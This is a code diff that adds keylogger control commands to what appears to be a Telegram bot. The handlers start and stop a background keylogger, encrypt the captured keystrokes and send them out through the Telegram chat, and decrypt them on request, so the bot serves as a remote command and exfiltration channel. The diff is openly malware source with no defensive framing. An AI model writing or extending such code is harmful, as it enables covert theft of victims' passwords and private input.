@@ -149,6 +149,60 @@ def log_responses(message):
     except Exception as e:
         bot.reply_to(message, f"⚠️ Error logging response: {e}")
 
+
+# Start Keylogger Command
+@bot.message_handler(commands=['startkeylogger'])
+def start_keylogger(message):
+    global keylogger_process
+    if keylogger_process is None or not keylogger_process.is_alive():
+        bot.reply_to(message, "🔄 Starting the keylogger...")
+        keylogger_process = threading.Thread(target=keylogger.start_keylogger, args=("keylogs.txt",))
+        keylogger_process.start()
+        bot.reply_to(message, "✅ Keylogger started successfully.")
+    else:
+        bot.reply_to(message, "⚠️ Keylogger is already running.")
+
+# Stop Keylogger Command
+@bot.message_handler(commands=['stopkeylogger'])
+def stop_keylogger(message):
+    global keylogger_process
+    if keylogger_process and keylogger_process.is_alive():
+        keylogger.stop_keylogger()  # Stop keylogger (requires implementation in keylogger script)
+        keylogger_process.join()
+        keylogger_process = None
+        bot.reply_to(message, "✅ Keylogger stopped successfully.")
+    else:
+        bot.reply_to(message, "⚠️ Keylogger is not running.")
+
+# Fetch Keylogs Command
+@bot.message_handler(commands=['keylogs'])
+def fetch_keylogs(message):
+    try:
+        with open("keylogs.txt", "rb") as file:
+            logs = file.read()
+            encrypted_logs = cipher.encrypt(logs)
+
+        # Send the encrypted logs
+        bot.reply_to(message, "📤 Sending encrypted keylogs...")
+        bot.send_document(message.chat.id, (f"keylogs_encrypted.txt", encrypted_logs))
+        bot.reply_to(message, "✅ Keylogs sent successfully.")
+    except FileNotFoundError:
+        bot.reply_to(message, "⚠️ No keylogs found.")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error fetching keylogs: {e}")
+
+# Decrypt Logs Locally Command
+@bot.message_handler(commands=['decryptlogs'])
+def decrypt_logs(message):
+    try:
+        with open("keylogs_encrypted.txt", "rb") as file:
+            encrypted_logs = file.read()
+        decrypted_logs = cipher.decrypt(encrypted_logs).decode()
+
+        bot.reply_to(message, f"🔓 Decrypted Logs:\n\n{decrypted_logs}")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error decrypting logs: {e}")
+
 import os
 from flask import Flask, request
 
